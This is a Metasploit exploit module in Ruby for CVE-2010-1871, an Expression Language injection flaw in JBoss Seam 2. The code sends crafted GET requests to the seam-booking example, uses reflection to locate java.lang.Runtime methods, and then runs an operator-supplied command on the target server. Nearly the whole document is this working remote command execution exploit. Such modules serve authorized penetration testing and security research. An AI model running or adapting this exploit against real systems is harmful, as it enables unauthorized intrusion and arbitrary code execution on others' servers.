#
# JBoss seam remote command execution exploit
#

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking 

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'JBoss seam remote command execution (seam-booking example)',
      'Description'    => %q{
          JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform 4.3.0 for Red Hat Linux,
          does not properly sanitize inputs for JBoss Expression Language (EL) expressions, which allows remote attackers
          to execute arbitrary code via a crafted URL.
          NOTE: this is only a vulnerability when the Java Security Manager is not properly configured. 
      },
      'Author'         => [ 'ruggine' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-1871' ],
          [ 'URL', 'http://' ],
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic'
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      # 'DisclosureDate' => '',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('JBOSS_ROOT',[ true, 'JBoss root directory', '/'])
      ], self.class)
  end

  def exploit
    connect
                jbr = datastore['JBOSS_ROOT']
                cmd_enc = ""
                cmd_enc << Rex::Text.uri_encode(datastore["CMD"])
                flag_java_one = 0
                flag_java_two = 0
                index = 0
                explo_part_1 = "seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
                explo_part_2 = "].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
                explo_part_3 = "].invoke(null),'"
                
    print_status("Finding getDeclaredMethods() indexes... (0 to 24)")
                
          while index <= 24
      req =
         "GET " + jbr + explo_part_1 + index.to_s + "]} HTTP/1.1\r\n" +
         "Host: #{rhost}\r\n\r\n"
    
      print_status("Trying index:" + index.to_s)
      sock.put(req)

      res = sock.get(3,3)
                        
                        if res.include? "java.lang.Runtime.exec%28java.lang.String%29"
        flag_java_one = index
        print_status("Found right index at:" + index.to_s)
      elsif res.include? "java.lang.Runtime+java.lang.Runtime.getRuntime"
        print_status("Found right index at:" + index.to_s)
        flag_java_two = index
                        end
      
      index += 1
                end

    if (flag_java_one > 0 && flag_java_two > 0)
      print_status("Found vulnerability...")
      print_status("Sending remote command:" + datastore["CMD"])
      req =
         "GET " + jbr + explo_part_1 + flag_java_one.to_s + explo_part_2 + flag_java_two.to_s + explo_part_3 + cmd_enc + "')} HTTP/1.1\r\n" +
         "Host: #{rhost}\r\n\r\n"
      sock.put(req)
      res = sock.get(3,3)
      puts res
      if res.include? "pwned=java.lang.UNIXProcess"
        print_status("Exploit successfull.")
      else
        print_status("Exploit failed.")
      end
      
    else
      print_status("Vulnerability not found.")
    end	

    handler
    disconnect
  end

end
